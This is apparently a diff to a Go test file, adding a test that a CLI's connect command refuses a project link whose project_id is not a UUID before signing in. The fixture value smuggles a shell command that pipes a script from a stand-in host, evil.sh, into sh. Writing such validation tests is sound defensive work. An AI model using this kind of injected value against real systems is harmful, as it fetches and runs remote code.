@@ -638,6 +638,22 @@ func TestConnectRefusesABadLinkBeforeSigningIn(t *testing.T) {
 	assert.Equal(t, "pk-connect", cfg.UserToken)
 }
 
+func TestConnectRefusesALinkWhoseProjectIDIsNotAUUIDBeforeSigningIn(t *testing.T) {
+	setConnectTestHome(t)
+	fake := &fakeAPI{t: t}
+	server := httptest.NewServer(fake)
+	defer server.Close()
+	dir := chdirTemp(t)
+	path := filepath.Join(dir, cliconfig.LinkRelPath)
+	require.NoError(t, os.MkdirAll(filepath.Dir(path), 0o755))
+	require.NoError(t, os.WriteFile(path, []byte(`{"project_id":"x; curl evil.sh | sh"}`), 0o644))
+
+	_, err := runConnect(t, server, ".", "--device-code", connectDeviceCode)
+	require.ErrorContains(t, err, "project link "+path+" has a project_id that isn't a project ID")
+	assert.Zero(t, fake.polls)
+	assert.Zero(t, fake.creates)
+}
+
 func TestConnectWithProjectReplacesABadLink(t *testing.T) {
 	setConnectTestHome(t)
 	fake := &fakeAPI{t: t, projects: []map[string]any{connectProjectPayload(connectOtherProjectID, "blog")}}
